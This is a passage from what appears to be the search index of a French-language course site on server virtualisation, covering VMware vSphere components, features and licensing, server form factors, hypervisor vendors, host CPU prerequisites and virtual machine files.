d'un logiciel que l'on appelle le client lourd qui permettait d'administrer \u00e0 partir soit de l'hyperviseur , soit du serveur vCenter la totalit\u00e9 des fonctionnalit\u00e9s de la vSphere. A partir de la version 6.0 la vSph\u00e8re va \u00eatre administrable depuis une interface web. Cette interface web va \u00eatre h\u00e9berg\u00e9e soit sur l'hyperviseur, soit directement sur le serveur vCenter. Le serveur V Center , qui assure la gestion globale de la vSphere. La transition entre la version 5 et les versions plus r\u00e9cente va \u00e9galement faire appara\u00eetre la possibilit\u00e9 d'avoir un vCenter en mode appliance, c'est \u00e0 dire que le vCenter va devenir une application l\u00e9g\u00e8re cette application va \u00eatre limit\u00e9e dans ses capacit\u00e9s elle ne pourra plus supporter un nombre illimit\u00e9 de machines virtuelles ni d'hyperviseur mais elle a l'avantage d'\u00eatre beaucoup moins gourmande en ressources elle va \u00e9galement pouvoir \u00eatre h\u00e9berg\u00e9e en tant que machine virtuelle \u00e0 l'int\u00e9rieur d'un hyperviseur. Le client web vSphere va \u00e9galement \u00e9voluer entre la version 6.0 et la version 6.5 en effet la version 6.0 n\u00e9cessite un navigateur web disposant de la fonctionnalit\u00e9 Adobe flash Player cette fonctionnalit\u00e9 \u00e9tant petit \u00e0 petit vou\u00e9e \u00e0 dispara\u00eetre sur les navigateurs la version 6.5 de sph\u00e8re utilise l'HTML 5.0 qui ne s'est qui ne qui ne n\u00e9cessit\u00e9 plus VMware Flash Player</p>"},{"location":"Virtualisation/vSphere/#composant-dun-solution-vsphere","title":"Composant d'un solution vSphere","text":"<p>La solution de virtualisation vSphere de VMware est compos\u00e9e de diff\u00e9rents \u00e9l\u00e9ments. Dans ces \u00e9l\u00e9ments nous allons retrouver le point central qui va \u00eatre l'ESXi. On peut \u00e9galement retrouver dans des versions pr\u00e9c\u00e9dentes, les hyperviseurs que l'on nommait ESX \u00e0 partir de la version 5, ces hyperviseurs vont s'appeler ESXi car il comporte leur propre interface web d'administration et nous pourrons les administrer eux m\u00eames sans passer par une solution de centralisation. L'hyperviseur va donc \u00eatre plac\u00e9 au centre de la vSphere car c'est l'\u00e9l\u00e9ment qui permet de mettre \u00e0 disposition les ressources physiques telles la RAM, le CPU, le stockage et les acc\u00e8s r\u00e9seau. Cette hyperviseur ESXi va \u00e9galement \u00eatre utilis\u00e9e par le vCenter. La solution de regroupement d'hyperviseur qui va assurer la liaison entre les diff\u00e9rents ESXi. C'est ESXi et ce vCenter vont pouvoir \u00eatre administr\u00e9s \u00e0 partir du client des vSphere. Si l'ont est sur des solutions \u00e0 partir de la version 5 qui est un logiciel \u00e0 install\u00e9 sur le syst\u00e8me d'exploitation client type Windows ou Linux, ce client va permettre d'administrer ind\u00e9pendamment chaque hyperviseur ESXi ou d'administrer la totalit\u00e9 de la vSphere si celle ci utilise la fonctionnalit\u00e9 vCenter. Sur chaque ESXi, nous allons retrouver des machines virtuelles. Ces machines virtuelles quant \u00e0 elles pourront \u00eatre administr\u00e9es , soit directement dans l'interface web de l'ESXi qui h\u00e9bergent la machine virtuelle , soit si on utilise un vCenter directement dans l'interface web d'administration du vCenter. Le vCenter faisant la liaison avec la totalit\u00e9 des \u00e9l\u00e9ments de la vSphere \u00e0 partir de son interface d'administration nous avons la possibilit\u00e9 soit de d\u00e9terminer le comportement de chaque hyperviseur ESXI, soit de d\u00e9cider d'une modification globale \u00e0 tous les hyperviseurs. \u00c9galement au niveau des machines virtuelles , c'est gr\u00e2ce \u00e0 la globalisation du vCenter que l'on va pouvoir d\u00e9terminer des restrictions de capacit\u00e9 ou des restrictions d'utilisation de ressources pour les machines virtuelles, c'est \u00e9galement \u00e0 partir de l'interface d'administration du vCenter que nous allons pouvoir d\u00e9placer une machine virtuelle d'un hyperviseur a un autre. Ici le vCenter a un r\u00f4le d'encadrement et de surveillance et le client vSphere \u00e0 partir duquel l'administrateur ou le technicien va intervenir a un r\u00f4le de surveillance et de commande ou d'administration sur la totalit\u00e9 de la vSphere. Attention tout de m\u00eame dans une vSphere la totalit\u00e9 des \u00e9l\u00e9ments doit \u00eatre concordant au niveau des versions. En effet, si plusieurs hyperviseurs sont dans une version ESXI diff\u00e9rentes, typiquement une version x.0 sur un hyperviseur x.5 sur un autre. Alors le vCenter devra \u00eatre dans la version la plus \u00e9lev\u00e9e pour pouvoir administrer la totalit\u00e9 des hyperviseurs. Il est recommand\u00e9 pour la fiabilit\u00e9 de la vSphere, d'avoir des versions d'\u00e9l\u00e9ments homog\u00e8nes. En effet, on pr\u00e9conise une version de vCenter la plus r\u00e9cente possible et des versions concordantes sur les ESXI. Pour terminer, il n'est pas possible d'avoir des versions diff\u00e9rentes entre les hyperviseurs et le V Center. Un hyperviseur de type 6.5 ne pourra pas fonctionner avec vCenter de type 7 (qu'ils soient en 7.0 ou 7.5).  </p>"},{"location":"Virtualisation/vSphere/#principales-fonctionnalites","title":"Principales fonctionnalit\u00e9s","text":"<p>Dans le module pr\u00e9c\u00e9dent nous avions indiqu\u00e9 les possibilit\u00e9s offertes par le vCenter. En effet le vCenter va permettre de disposer de fonctionnalit\u00e9s avanc\u00e9es. C'est fonctionnalit\u00e9s avanc\u00e9es n\u00e9cessite d'avoir un nombre d'hyperviseurs minimum la pr\u00e9conisation veut que 3 hyperviseurs ayant des capacit\u00e9s identiques et des versions d'hyperviseur identiques permettent d'avoir un fonctionnement optimal des fonctionnalit\u00e9s de la vSphere. c'est fonctionnalit\u00e9s de la vSphere vont avoir plusieurs r\u00f4les : le premier va \u00eatre de consolider l'infrastructure de virtualisation en effet le fait de disposer de plusieurs hyperviseurs va permettre en cas de d\u00e9faillance va permettre de remplacer sans arr\u00eat de production une machine virtuelle par une autre, voir de d\u00e9placer des machines virtuelles d'un hyperviseur \u00e0 un autre sans avoir \u00e0 arr\u00eater la machine virtuelle. Ces fonctionnalit\u00e9s avanc\u00e9es fonctionnent gr\u00e2ce au vCenter qui \u00e9tant ind\u00e9pendant d'un hyperviseur va pouvoir declencher des actions en cas de d\u00e9faillance d'un hyperviseur.  Parmi ces fonctionnalit\u00e9s avanc\u00e9es , nous avons le vMotion. Fonctionnalit\u00e9s de VMware qui permet de d\u00e9placer une machine virtuelle d'un hote vers un autre h\u00f4te. Cette fonction est une fonction dite \"\u00e0 froid\". Les pr\u00e9requis sont nombreux pour pouvoir assurer cette fonctionnalit\u00e9. Nous les verrons \u00e0 la suite de ce module. Cette fonctionnalit\u00e9 va permettre de d\u00e9placer manuellement par une op\u00e9ration d'un technicien ou d'un administrateur, une machine virtuelle d'un hyperviseur vers un autre hyperviseur sans proc\u00e9d\u00e9 \u00e0 l'arr\u00eat de la machine virtuelle. La seconde fonctionnalit\u00e9e bas\u00e9 sur le m\u00eame principe ne concerne que les fichiers de stockage de la machine virtuelle. En effet , nous allons aborder dans les prochains modules les diff\u00e9rentes solutions de stockage n\u00e9cessaires \u00e0 une vSphere dans le cas ou nous pouvons utiliser une solution de stockage externe aux hyperviseurs donc ne d\u00e9pendant pas des hotes de virtualisation, nous pourrons utiliser la fonctionnalit\u00e9 \"storage vMotion\" cette fonctionnalit\u00e9 va permettre de d\u00e9placer les ressources de stockage d'une machine virtuelle d'un hote sur lequel elle est h\u00e9berg\u00e9 initialement vers un syst\u00e8me de stockage qui n'a aucune d\u00e9pendance par rapport \u00e0 un hyperviseur. Dans ce cas si la machine n'a plus de d\u00e9pendance au niveau du stockage on peut tol\u00e9rer la perte m\u00e9canique d'un hyperviseur la machine virtuelle continuera \u00e0 fonctionner sur un autre hyperviseur sans stockage n'\u00e9tant pas li\u00e9 a l'un ni \u00e0 l'autre de nos hyperviseurs. Il existe beaucoup d'autres fonctionnalit\u00e9s comme la fonctionnalit\u00e9 HA est FaultTolerance, c'est fonctionnalit\u00e9 l\u00e0 vont \u00eatre l'identique de vMotion et Storage vMotion mais c'est fonctionnalit\u00e9s l\u00e0 sont vite \"chaudes\" c'est \u00e0 dire qu'il n'y a pas d'action manuelle d'un technicien ou d'un administrateur pour d\u00e9clencher le d\u00e9placement de la machine virtuelle mais c'est le vCenter lui m\u00eame qui va prendre la d\u00e9cision de d\u00e9placer ou le stockage de la machine virtuelle ou la machine virtuelle vers un autre hyperviseurs c'est fonctionnalit\u00e9 l\u00e0 ne sont pas abord\u00e9s ici on abordera simplement le vMotion et le Storage vMotion.  </p>"},{"location":"Virtualisation/vSphere/#tableau-comparatif-des-couts","title":"Tableau comparatif des couts","text":"<p>La solution de virtualisation VMware est r\u00e9partie selon plusieurs sch\u00e9mas ces sch\u00e9mas vont inclure des co\u00fbts au niveau des licences d'acquisition. En effet la vSphere va pouvoir \u00eatre r\u00e9partie sur un nombre important de machines virtuelles, notamment dans un concept de data Center. La r\u00e9partition du co\u00fbt va se faire en fonction de 2 principes, le nombre de processeurs qu'ils vont \u00eatre mis \u00e0 disposition pour les machines virtuelles et \u00e9galement le nombre de machines qui vont entrer dans la composition de la vSphere. Dans le premier cas la licence pour exploiter l'hyperviseur de VMware seul ne n\u00e9cessite pas l'achat d'une licence. En effet , le logiciel de l'hyperviseur est construit autour d'une distribution Linux open source. Cette distribution ne peut donc pas \u00eatre vendue. Toutefois, elle permet simplement de cr\u00e9er des machines virtuelles, mais elle ne permet pas d'avoir une gestion globale \u00e0 partir du vCenter. La gestion se fera en mode autonome hyperviseur par hyperviseur. Toutefois, pour de petites entreprises ou pour la d\u00e9couverte de la solution de virtualisation, l'utilisation d'un ESXi en mode syst\u00e8me standalone (en mode autonome) permet de conna\u00eetre et d'appr\u00e9hender les bases de la solution. La premi\u00e8re \u00e9tape va constituer la suite dite \"essential\". En effet , VMware mais \u00e0 disposition , une version essentielle de sa vSphere. Cette version va se retrouver limit\u00e9e en termes de fonctionnalit\u00e9s. Toutefois, les fonctionnalit\u00e9s qui ne sont pas accessibles sont des fonctionnalit\u00e9s n\u00e9cessitant un nombre tr\u00e8s important de machines et de ressources. Les fonctionnalit\u00e9s disponibles dans la version essential ne seront pas limit\u00e9es dans le temps. Elles seront acquises pour une dur\u00e9e illimit\u00e9e. Elles seront toutefois limit\u00e9es \u00e0 6 processeurs . VMware limitant le nombre d'utilisations de processeurs dans sa vSphere pour la version essential. On ne pourra pas d\u00e9passer plus de 6 processeurs dans la vSphere. La r\u00e9partition logique voudrait que 3 hyperviseurs soient pr\u00e9sents , chaque hyperviseur comportant 2 processeurs. Puis nous avons une licence pour le vCenter Server dans sa version essential, cette licence va permettre de pouvoir \u00e0 l'oppos\u00e9 d'un ESXi seul de pouvoir g\u00e9rer , la vSphere de mani\u00e8re globale. Toutefois , le vCenter etant dans \u00e0 sa version essential des fonctionnalit\u00e9s ne seront pas disponibles. La version destin\u00e9e aux entreprises de taille interm\u00e9diaire qui n\u00e9cessitent d'avoir un syst\u00e8me de virtualisation optimale et sur. Va \u00eatre la version standard La version standard n'est pas limit\u00e9 dans le temps donc les droits sont acquis ind\u00e9finiment. le logiciel standard comprend un seul CPU et une seule licence de vSPhere V Center serveur. Il faut donc multiplier le co\u00fbt de la licence standard par le nombre de processeurs pr\u00e9sents dans la vSphere. En Conditions d'exploitation id\u00e9ales on peut retrouver 3 \u00e0 6 serveurs, si chaque serveur comprend 2 processeurs, il faut multiplier le droit de licence par 12. Puis si la taille de la vSphere augmente encore une seconde licence vCenter serveur sera n\u00e9cessaire et ainsi de suite pour pouvoir au fur et \u00e0 mesure augmenter les capacit\u00e9s de la vSphere. Enfin la version vSphere entreprise plus va int\u00e9grer l'ensemble des fonctionnaires de la vSphere par rapport \u00e0 la version standard qui ne permet pas d'atteindre certaines fonctionnalit\u00e9s tr\u00e8s \u00e9volu\u00e9es. C'est fonctionnalit\u00e9s vont \u00eatre dans le calcul ou la recherche ou l'intelligence artificielle. La version vSPhere entreprise plus int\u00e8gre la totalit\u00e9 des fonctionnalit\u00e9s de la vSphere. Aucune limite dans le temps et cette licence ne permet l'utilisation que d'un seul CPU pour le vCenter Server, il faudra donc multiplier le co\u00fbt de cette licence par le nombre de processeurs de vCenter Server uniquement. Sachant qu'un vCenter serveur peut utiliser peut administrer 6 hyperviseurs au del\u00e0 de 6 hyperviseurs, quel que soit le nombre de processeurs de chaque hyperviseur. Il faudra acqu\u00e9rir un nouveau droit de vSphere entreprise plus par vCenter Server. En r\u00e9sum\u00e9, le droit d'acquisition de licences ne sont pas limit\u00e9es dans le temps. Ils correspondent soit \u00e0 un besoin d'une fonctionnalit\u00e9 pr\u00e9cise, soit un besoin de renforcement d'une infrastructure de virtualisation. Il est tr\u00e8s important de bien dimensionner son besoin avant de faire l'acquisition d'une licence vSphere.  </p>"},{"location":"Virtualisation/vSphere/#les-licences","title":"Les Licences","text":"<p>Nous avon vu que les licences \u00e9taient li\u00e9es soient \u00e0 des fonctionnalit\u00e9s soit \u00e0 des capacit\u00e9s au niveau d'un data Center. En effet chaque licence va \u00eatre li\u00e9e \u00e0 un nombre de processeurs pr\u00e9sents dans la vSphere. Sur ce tableau nous allons ici d\u00e9tailler les licences et leurs fonctionnalit\u00e9s dans un concept, notamment par rapport \u00e0 la taille d'une de l'entreprise et au besoin de ces entreprises. Pour une petite et moyenne entreprise on va plut\u00f4t d\u00e9dier sur une version essentials la version qui va nous permettre d'aller jusqu'\u00e0 6 CPU plus 1 vCenter en version essentials c'est \u00e0 dire avec des fonctionnalit\u00e9s classiques. Dans le cas d'une PME qui n\u00e9cessiterait des besoins sp\u00e9cifiques il existe \u00e9galement une version \"essentials plus\" qui va inclure quelques fonctionnalit\u00e9s additionnelles attention toutefois \u00e0 bien faire attention \u00e0 ce que ces fonctionnalit\u00e9s additionnelles ne n\u00e9cessitent pas une puissance sup\u00e9rieure \u00e0 6 CPU, en effet la version essentials et \"essentials plus\" reste brid\u00e9 \u00e0 6 CPU maximum. Le couts de revient peut \u00eatre divis\u00e9 par la dur\u00e9e dans le temps, ces versions l\u00e0 poses toutefois un probl\u00e8me puisqu'elles ne peuvent pas \u00eatre \u00e9volu\u00e9es vers une version \"standard\", il n'est pas possible de repasser ou de faire \u00e9voluer ces licences il est n\u00e9cessaire de racheter une version standard on ne peut pas convertir une licence \"essentials plus\" vers \"standard\" ces 2 licence inclut \u00e9galement une version de \"vCenter Foundation\".  </p> <p>Dans le cas d'une entreprise interm\u00e9diaire, d'une grande entreprise ou d'une entreprise o\u00f9 aura besoin de fonctionnalit\u00e9s sp\u00e9cifiques. Il existe 3 possibilit\u00e9s : La premi\u00e8re possibilit\u00e9 est la version standard qui inclut ses fonctions additionnelles \u00e0 la version essentials mais qui attention vont \u00eatre limit\u00e9es en nombre de licences vCenter Server. La version \"Entreprise plus\" qui inclut la totalit\u00e9 des fonctionnalit\u00e9s et qui elle m\u00eame va \u00eatre limit\u00e9e par rapport au nombre de licences vCenter Server. \u00c9galement, il existe une version platinum. Cette version n'est pas c\u00f4t\u00e9e directement, cette version inclut un support et une assistance pr\u00e9f\u00e9rentielle de la part de VMware.  Cette version Platinum est une version totalement personnalisable en fonction des besoins d'une entreprise. Toutefois , le co\u00fbt de l'\u00e9tude de cette solution n'est a la disposition que de quelques grandes entreprises.  </p> <p>Donc une entreprise , connaissant son besoin pr\u00e9cis , ira vers une solution essentials et essentials plus. Une entreprise qui souhaite avoir une forte \u00e9volution ou la possibilit\u00e9 d'utiliser des fonctionnalit\u00e9s avanc\u00e9es , utilisera ou la version \"standard\" ou la version \"entreprise Plus\". Attention toutefois dans ces versions l\u00e0, il y a une limite de quantit\u00e9 maximale de RAM par hote.  </p>"},{"location":"Virtualisation/virtualisation_srv/","title":"Virtualisation de serveurs","text":""},{"location":"Virtualisation/virtualisation_srv/#type-de-serveurs","title":"Type de Serveurs","text":"<p>Les solutions de virtualisation s'appuie sur des serveurs physiques r\u00e9partis en 3 grandes cat\u00e9gories.  </p> <p></p> <p>Ces cat\u00e9gories vont d\u00e9terminer :  </p> <ul> <li>la puissance,  </li> <li>la performance  </li> <li>la robustesse d'exploitation.  </li> </ul> <p>La 1ere cat\u00e9gorie: Serveurs Tours:  </p> <p>Ils sont \u00e9quivalent \u00e0 des tours informatique classiques, \u00e0 la diff\u00e9rence quelles vont emporter des CPU plus puissants et plus nombreux, des quantit\u00e9s de RAM, beaucoup, plus importante (allant jusque plusieurs To).  </p> <p>Les solutions tours de part leurs facilit\u00e9s de deployement, seront utilis\u00e9es pour de la virtualisation dans des petites et moyennes structures, En effet elles ne n\u00e9cessitent pas d'infrastructures techniques suppl\u00e9mentaires, elles peuvent \u00eatre raccord\u00e9es directement aux solutions de r\u00e9seau ou au solutions de raccordement \u00e9lectrique et de secours (type Onduleur).  </p> <p>Cependant ces solutions de type tours sont encombrantes et g\u00e9n\u00e8re \u00e9galement un bruit important.  </p> <p>La 2eme cat\u00e9gorie: Serveurs Racks:  </p> <p>Les solutions de type Racks n\u00e9cessitent, quant \u00e0 elles, l'installation d'un chassis permettant de les heberger.  </p> <p>Concernant la configuration technique celle-ci sera quasiment identique au serveur Tours, en effet il pourront \u00e9galement acceuillir plusieurs CPU ainsi qu'une quantit\u00e9 de m\u00e9moire \u00e9quivalente au cat\u00e9gorie 1.  </p> <p>A la diff\u00e9rence des serveurs Tours, les serveurs Rack n\u00e9cessiteront une configuraton r\u00e9seau et \u00e9lectrique \u00e9tablie et install\u00e9 avant la mise en place des serveurs. Des chemins de c\u00e2ble doivent \u00eatre mis en place pour faciliter l'insertion des racks dans les structures. Ces structures (baie de brassage) sont statiques, a la diff\u00e9rence d'un serveur tours beaucoup plus mobile, et doivent \u00eatre correctement organis\u00e9es.  </p> <p>Les serveurs de type Rack seront destin\u00e9s \u00e0 des structures interm\u00e9diaire ayant un besoin de puissance et d'\u00e9volutivit\u00e9 importante.  </p> <p>La 3eme cat\u00e9gorie: Serveur Chassis+Lames: </p> <p>D\u00e9di\u00e9 aux entreprises n\u00e9cessitant une grande modularit\u00e9 et ayant un besoin de puissance. Ce type de serveur est modulaire gr\u00e2ce aux lames venant s'int\u00e9grer aux chassis.  </p> <p>Une lames contiendra :  </p> <ul> <li>1 CPU  </li> <li>RAM (la quantit\u00e9 variera selon la lame)  </li> <li>Stockage  </li> </ul> <p>Cette modularit\u00e9 est permise par le fait que chaque lames aura un r\u00f4le pr\u00e9cis dans le chassis. Certaine seront d\u00e9di\u00e9es au calcul et soliciteront leur CPU, d'autre seront utilis\u00e9es pour le stockage, etc. Il sera \u00e9galement facile de faire \u00e9voluer le mat\u00e9riel. De nouvelles lames, comportant de nouveaux composants, sont r\u00e9guli\u00e8rement mis \u00e0 disposition par les constructeurs permettant ainsi de monter en puissance de CPU, quantit\u00e9 de RAM, etc. A savoir que certaines lames, ins\u00e9rer dans un chassis, peuvent rester dans un \u00e9tat \"Passif\" afin d'assurer une reserve chaude en cas de d\u00e9faillance d'autre lames.  </p> <p>Ces serveur de type Chassis seront destin\u00e9s aux entreprises de grande envergure ou pour les Data Center, qui ensuite seront \u00e0 disposition d'autres entreprises.</p> <p>Toutefois ces ch\u00e2ssis n\u00e9cessitent une alimentation \u00e9lectrique et un secours \u00e9lectrique permanent, ainsi qu'un syst\u00e8me de refroidissement de tr\u00e8s bonne configuration.  </p>"},{"location":"Virtualisation/virtualisation_srv/#fournisseurs-de-solutions-de-virtualisation","title":"Fournisseurs de solutions de virtualisation","text":"<p>Voici les 4 fournisseurs les plus importants de solutions de virtualisation niveau serveur. Ces 4 fournisseurs, ces constructeurs, vont mettre a disposition des solutions compl\u00e8tes de virtualisation comportant chacunes un hyperviseur, permettant l'emploi des fonctionnalites de chaque solutions.  </p> <p>Chez VMware, la solution vSphere, fonctionnant autour de l'hyperviseur ESXi permettant de virtualiser des serveurs, des postes de travail, des applications, du r\u00e9seau, etc.  </p> <p>La solution Hyper-V, \u00e9galement la plus r\u00e9pandue pour la simple et bonne raison que l'achat d'une licence Windows Server permet l'acquisition en m\u00eame temps de la solution Hyper-V. Elle permet de virtualiser des serveurs, mais \u00e9galement par l'interm\u00e9diaire du r\u00f4le RDS (Remote Desktop Serveur) de mettre a dispositions des VDI.  </p> <p>Chez Xen nous allons retrouver la solution XenServeur. Cette solution sera orient\u00e9e sur la fourniture de base de travail VDI (Virtuel Desktop Infrastructure). Le constructeur Citrix ayant acquis cette solution \u00e0 d\u00e9dier son hyperviseur \u00e0 la fourniture de VDI. On peut le voir chaque fournisseur va d\u00e9dier sa solution \u00e0 un m\u00e9tier o\u00f9 rester tr\u00e8s g\u00e9n\u00e9raliste.  </p> <p>L'hyperviseur KVM aujourd'hui int\u00e9gr\u00e9 dans tous les noyaux Linux, Toute distribution, actuelle, \u00e0 base de noyau Linux va avoir la possibilit\u00e9 par l'ajout de l'interface graphique QEMU (ou en ligne de commande) de virtualiser des serveurs Linux ou Windows. Cette hyperviseur va se retrouver dans la distribution Linux Proxmox, qui en plus va int\u00e9grer une interface web de gestion de serveur.  </p> <p>Comme ont vient de le voir chaque constructeur va orienter sa solution en fonction d'un besoin. Certaines solutions vont \u00eatre totalement autonomes comme VMware ou d'autres vont d\u00e9pendre de fonctions additionnelles comme KVM, d\u00e9pendant de la fonction QEMU, o\u00f9 se retrouver au sein d'une distribution compl\u00e8te comme proxmox ou dans le cadre d'hyperV n\u00e9cessit\u00e9 l'utilisation de Windows Server.  </p>"},{"location":"Virtualisation/virtualisation_srv/#la-machine-hote","title":"La machine h\u00f4te","text":"<p>chaque serveur vas vous avoir une sp\u00e9cificit\u00e9 mat\u00e9rielle et chaque solution va tirer parti de ces solutions mat\u00e9rielles. la machine hote va \u00eatre le centre de la solution de virtualisation en effet les performances de virtualisation seront li\u00e9es directement \u00e0 la machine hote et \u00e0 l'int\u00e9gration de la solution de virtualisation sur cette hote. Il doit respecter des contraintes pour pouvoir h\u00e9berger des machines virtuelles quel que soit la solution de virtualisation. Dans le cas d'une machine de type tours ou de type rack et \u00e9galement dans le cas d'une lame, le processeur ou les processeurs pr\u00e9sents sur ces machines doivent respecter la contrainte de l'instruction CPU. Tout CPU de la famille de type Intel doit avoir la fonctionnalit\u00e9 de type VT-x d'une version diff\u00e9rente selon les g\u00e9n\u00e9rations du processeur et pour les processeurs de la famille AMD l'instruction de type AMD-v. Il y a \u00e9galement une deuxieme fonctionnalit\u00e9 que l'on appelle le SLAT, le SLAT qui va cette fois ci intervenir au niveau de la RAM. En effet, sans cette fonctionnalit\u00e9, la quantit\u00e9 de m\u00e9moire allou\u00e9e \u00e0 la machine virtuelle serait doubl\u00e9e puisque la machine virtuelle r\u00e9serverait une quantit\u00e9 de m\u00e9moire pour d\u00e9marrer et pendant son fonctionnement et cette quantit\u00e9 de m\u00e9moire devrait \u00eatre r\u00e9serv\u00e9e au niveau de la machine hote, y compris lorsque la machine virtuelle n'est pas en fonction. Gr\u00e2ce \u00e0 la fonctionnalit\u00e9 SLAT que l'on retrouve dans la famille de processeur Intel sous le nom de EPT ou dans la famille de processeur AMD sous le nom de NPT ou RVI selon les g\u00e9n\u00e9rations de processeurs. la quantit\u00e9 de ram utilis\u00e9e r\u00e9ellement par la machine virtuelle sera r\u00e9serv\u00e9e directement sur le syst\u00e8me. la fonction SLAT \u00e9vite ce que l'on appelle un double adressage donc une double r\u00e9servation une donn\u00e9e pr\u00e9sente dans la m\u00e9moire vive de la machine virtuelle va \u00eatre pr\u00e9sente dans la m\u00e9moire vive de la machine physique mais il n'y aura pas 2 fois la m\u00eame instruction r\u00e9serv\u00e9e sur la machine physique. Donc une fois que l'on a choisi notre solution de virtualisation et notre machine, il faut bien v\u00e9rifier que tous les pr\u00e9requis \u00e0 la virtualisation sont en place.  </p>"},{"location":"Virtualisation/virtualisation_srv/#lhyperviseur","title":"L'Hyperviseur","text":"<p>Element centrale d'une solution de virtualisation l'hyperviseur va venir directement r\u00e9server les performances sur notre hote. une fois les pr\u00e9requis de l'hote satisfait la solution de virtualisation va par l'interm\u00e9diaire de l'hyperviseur venir travailler avec les composants mat\u00e9riels de notre machine hote. l'hyperviseur va \u00eatre diff\u00e9rent en fonction de la solution de virtualisation pour VMware on va retrouver l'hyperviseur ESX pour les g\u00e9n\u00e9rations 1 \u00e0 4 et ESXi pour les g\u00e9n\u00e9rations 5 \u00e0 8. Cette hyperviseur ce mat\u00e9rialise par un logiciel installer avec son propre syst\u00e8me d'exploitation et va permettre par l'interm\u00e9diaire du driving de r\u00e9cuperer les performances mat\u00e9rielles et de les allouer \u00e0 la solution de virtualisation. Chez Microsoft, l'hyperviseur est hyper-V. Cet hyperviseur est de niveau 1 pour la solution autonome Microsoft Windows Server hyper V ou de types 2 pour la fonction hyper V int\u00e9gr\u00e9e \u00e0 Windows. l'hyperviseur est caract\u00e9ris\u00e9 par un logiciel. Ce logiciel va \u00eatre charg\u00e9 de l'interface avec le mat\u00e9riel. Il est important de v\u00e9rifier la compatibilit\u00e9 logiciel avec la machine hote.  </p>"},{"location":"Virtualisation/virtualisation_srv/#solution-de-gestion-unique","title":"Solution de Gestion Unique","text":"<p>La solution de virtualisation va s'appuyer en grande partie sur le logiciel de l'hyperviseur. en effet comme on vient de le voir le logiciel de l'hyperviseur est directement en lien avec la machine physique. toutefois ce logiciel ne permet pas de g\u00e9rer la virtualisation de serveur en effet ce logiciel est d\u00e9di\u00e9 uniquement au lien avec la machine hote. chaque solution va ajouter un outil de gestion qui est propre \u00e0 chaque solution. Pour VMware, nous vous retrouvons donc la solution vSphere qui va int\u00e9grer un client web, une interface web dans lequel nous allons pouvoir r\u00e9cup\u00e9rer les ressources mises \u00e0 disposition et cr\u00e9er de nouvelles machines virtuelles. Cet outil de gestion va \u00eatre accessible, soit par l'interm\u00e9diaire d'une console, soit par l'interm\u00e9diaire d'une ligne de commande, soit par l'interm\u00e9diaire d'une interface graphique. dans le cas de Microsoft hyper V on retrouve une MMC , une multim\u00e9dia console propre \u00e0 Windows et d\u00e9di\u00e9 \u00e0 hyper-V. dans cette console graphique , nous allons pouvoir g\u00e9rer le comportement \u00e0 la fois de l'hyperviseur , des machines virtuelles li\u00e9es \u00e0 cette hyperviseur , mais \u00e9galement de toute la gestion du r\u00e9seau des p\u00e9riph\u00e9riques et \u00e9galement des dossiers partag\u00e9s entre les machines virtuelles et les machines physiques. L'outil de gestion de solutions est indispensable, on le nomme Virtual machine manager. Il permet comme sur VMware workstation, de pouvoir construire des missions virtuelles \u00e0 partir du mat\u00e9riel. Il permet \u00e9galement d'interargir avec des machines virtuelles en fonctionnement , de g\u00e9rer leur extinction , le red\u00e9marrage et \u00e9galement de pouvoir modifier leur configuration .Ce composant est syst\u00e9matiquement int\u00e9gr\u00e9 \u00e0 tout hyperviseur pr\u00e9sent dans une solution de virtualisation .</p>"},{"location":"Virtualisation/virtualisation_srv/#les-machines-virtuelles","title":"Les machines virtuelles","text":"<p>Les VM vont \u00eatre h\u00e9berg\u00e9s et cr\u00e9\u00e9s sur la solution de virtualisation par l'interm\u00e9diaire de l'hyperviseur. leur fonctionnement va d\u00e9pendre en totalit\u00e9 des performances et des ressources que l'hyperviseur va mettre \u00e0 disposition par l'interm\u00e9diaire de l'hote. ces machines virtuelles vont \u00eatre caract\u00e9ris\u00e9es de la m\u00eame fa\u00e7on par la pr\u00e9sence d'un fichier qui va indiquer leurs caract\u00e9ristiques, mat\u00e9rielles et logicielles, comme le type de plate forme utilis\u00e9 le syst\u00e8me d'exploitation hote et toutes les caract\u00e9ristiques de la machine virtuelle. ensuite nous allons retrouver un fichier d'images disques qui va correspondre au disque dur virtuel associ\u00e9 \u00e0 la machine virtuelle. il faut un fichier par disque dur virtuel ces fichiers vont avoir une taille qui va \u00eatre qui va d\u00e9pendre de la quantit\u00e9 de donn\u00e9es \u00e0 stocker par la machine virtuelle. Nous avons \u00e9galement des ressources comme la RAM qui va \u00eatre contenue dans un fichier de type VRAM. Ce fichier va \u00eatre d\u00e9truit lorsque la machine virtuelle s'arr\u00eate. C'est un fichier d'\u00e9change qui va faire le lien entre la m\u00e9moire virtuelle associ\u00e9e \u00e0 la machine virtuelle et les enregistrement de la m\u00e9moire physique h\u00e9berg\u00e9e sur l'hote. Les ressources CPU vont \u00eatre r\u00e9serv\u00e9es directement par l'hyperviseur et mis \u00e0 disposition \u00e0 la machine virtuelle. Pour la partie r\u00e9seau, une machine virtuelle va pouvoir avoir plusieurs cartes r\u00e9seau disponible avec diff\u00e9rents topologies, diff\u00e9rents modes de fonctionnement. Les r\u00e9seaux accessibles par les machines virtuelles, d\u00e9pendent directement des connexions r\u00e9seau disponibles sur l'hote de virtualisation. En effet, le mode de type bridge permet de faire le lien entre le r\u00e9seau physique raccord\u00e9 \u00e0 l'h\u00f4te physique et les cartes r\u00e9seaux virtuelles li\u00e9es aux machines virtuelles par l'interm\u00e9diaire de l'hyperviseur et de la solution de virtualisation.  </p> <p>En r\u00e9sum\u00e9 une machine virtuelle est h\u00e9berg\u00e9e sur un hyperviseur. les caract\u00e9ristiques de l'hote de virtualisation vont indiquer les performances de la machine virtuelle, notamment l'acc\u00e8s au r\u00e9seau, la quantit\u00e9 de RAM maximales disponibles et toutes ces caract\u00e9ristiques sont regroup\u00e9es dans des fichiers qui d\u00e9terminent la machine virtuelle.  </p>"},{"location":"Virtualisation/virtualisation_srv/#solutions-de-gestion-globale","title":"Solutions de gestion globale","text":"<p>Une solution de virtualisation se compose d'un hyperviseur qui est le centre de la solution puisque il est li\u00e9 sur un autre physique, et \u00e0 partir de cet h\u00f4te physique il met \u00e0 disposition les ressources pr\u00e9sentes sur celui ci. Toutefois, les solutions de virtualisation vont \u00eatre capables de r\u00e9partir la puissance de plusieurs hotes au sein d'une seule et m\u00eame solution. Les machines virtuelles vont toutes \u00eatre cr\u00e9\u00e9es et h\u00e9berg\u00e9es sur un hyperviseur mais ces hyperviseurs vont \u00eatre regroup\u00e9s au sein d'un seul et m\u00eame \u00e9l\u00e9ment. Si nous prenons le cas d'Hyper-V, l'hyperviseur de Microsoft, plusieurs 